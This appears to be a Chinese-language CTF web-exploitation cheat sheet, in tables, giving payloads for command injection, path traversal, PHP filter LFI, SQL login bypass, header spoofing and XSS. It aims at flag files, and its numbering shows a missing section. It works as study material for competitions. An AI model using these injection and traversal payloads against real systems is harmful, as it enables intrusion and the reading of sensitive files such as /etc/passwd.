### 一、 命令注入 (Command Injection) 的题目类型与技巧

命令注入的目标是中断原始的系统命令，并插入新的系统命令。

| 题目类型 | 核心技巧与利用手法 | 具体利用 |
| :--- | :--- | :--- |
| **普通带回显命令注入** | **命令串联**：使用 Shell 元字符（如 `;` 或 `&`）来分隔和执行多个命令。 | **利用**：在参数中注入 `ip_address=127.0.0.1; cat /FLAG.txt`。 |
| **盲命令注入 (Blind CI)** | **时间延迟探测**：在没有直接回显的情况下，使用 `SLEEP(X)` 或 `time -p curl` 来判断命令是否执行，例如在 SQL 或命令执行上下文中。 |
| **通过 Shell 查找敏感文件** | 利用 Shell 命令查找标志文件，特别是在 Web Shell 上传成功后。 | **利用**：`c=find / -maxdepth 3 -iname flag\* -type f 2>/dev/null; echo __END__` 来搜索文件，并使用特殊字符串 `__END__` 标记输出结束。 |

### 三、 综合探测、信息收集与辅助绕过手法

成功的渗透通常需要结合多种信息收集和绕过技术。

#### 1. 信息收集与发现

| 手法/工具 | 目的 | 具体操作 |
| :--- | :--- | :--- |
| **目录/文件模糊测试** | 发现隐藏的端点、泄露的配置文件或备份文件。 | 使用 **`feroxbuster`**、**`gobuster`**、**`ffuf`** 或 **`dirb`** 扫描常见路径如 `/admin`, `/api/flag`, `/config.php`, `.env` 等。 |
| **静态资源隐写** | 检查图像、CSS、JS 等静态文件中是否包含敏感信息。 | **利用**：下载图片（如 `.png` 或 `.jpg`），然后使用 **`strings -n 8`** 和 **`grep -i -E 'flag\{|ctf\{'`** 搜索隐藏的标志字符串。 |
| **敏感文件尝试** | 直接尝试访问常见的 Flag 路径。 | 使用 `curl` 尝试 `/flag`, `/flag.txt`, `/FLAG.txt`, `/var/www/flag.txt` 等。 |
| **内部 IP 探测** | 使用 SSRF 或 URL 包含漏洞探测内部服务。 |

#### 2. 认证和过滤绕过

| 绕过场景 | 核心技巧与利用手法 | 具体操作 |
| :--- | :--- | :--- |
| **目录遍历过滤** | 使用不同形式的 `../` 编码。 | **利用**：尝试 `..%2f..%2fetc%2fpasswd`、`..%2e%2f..%2e%2fetc%2fpasswd` 或 `/static/%2e%2e/flag.txt`。 |
| **PHP LFI 协议绕过** | 使用 PHP 协议绕过文件扩展名限制。 | **利用**：`php://filter/convert.base64-encode/resource=index.php`。 |
| **SQL 认证绕过** | 使用经典的万能密码。 | **利用**：在登录表单中注入 `username=' OR '1'='1' -- -` 或 `username='OR%091=1#` (利用 URL 编码和注释)。 |
| **HTTP 头部伪造** | 尝试在请求头中注入特殊的调试或权限提升头。 | **利用**：在请求中添加 `X-Admin: 1` 或 `X-Forwarded-For: 127.0.0.1` 来尝试触发调试模式或内部访问权限。 |
| **XSS 利用 (客户端)** | 在 RCE/CI 失败时，验证输入点是否可用于 XSS 注入，从而进一步分析客户端代码或证明输入未被转义。 | **利用**：使用 `<svg onload=alert('XSS')>` 或 `<img src=x onerror=alert('XSS')>` 以及 JavaScript 构造函数如 `[]['filter']['constructor']('alert(\'XSS\')')()` 进行客户端代码执行。 |


## 四、 辅助漏洞利用与信息发现技巧

在实际的 Web 挑战中，SSTI 往往与其他漏洞或利用技术结合使用。

### 1. 路径遍历/本地文件包含 (LFI)

即使没有完整的 SSTI RCE，攻击者也会尝试利用路径遍历来读取敏感文件。

| 目标 | 技巧/手法 | 示例 Payload (URL 参数) |
| :--- | :--- | :--- |
| **读取敏感文件** | 使用 `../` 或编码形式 (`..%2f`) 遍历目录结构，读取 `/etc/passwd` 或 `/FLAG.php` 等文件。 | `filename=../../etc/passwd` | |
| **读取源代码** | 利用 PHP 封装器（如 `php://filter`）来 Base64 编码服务器端的文件，以读取其源代码。 | `id=php://filter/convert.base64-encode/resource=post.php` | |

### 2. 命令注入/辅助 RCE

如果模板引擎参数无法直接 RCE，但服务器将输入传递给系统命令（如 Ping 功能），则可利用**命令注入**。

| 目标 | 技巧/手法 | 示例 Payload (POST 参数) | 
| :--- | :--- | :--- | 
| **命令执行并外带结果** | 注入命令，将结果重定向到 Web 路径下可访问的文件，然后通过 HTTP 请求读取该文件。 | `ip_address=127.0.0.1; cat /FLAG.txt > static/flag.txt` | |

### 3. 信息泄露与调试模式

通过修改 URL 参数或 HTTP Header，尝试触发服务器的调试模式或配置信息泄露。

| 目标 | 技巧/手法 | 示例 Payload | 
| :--- | :--- | :--- | 
| **触发调试信息** | 尝试在 URL 中添加常见的调试或源码参数。 | `?debug=1`, `?source=1`, `?view-source` | |
| **泄露 Session 内容** | 在某些框架中，使用特定参数可以显示服务器端 Session 存储的内容，其中可能包含管理员身份或敏感路径。 | `?debug=session` | |
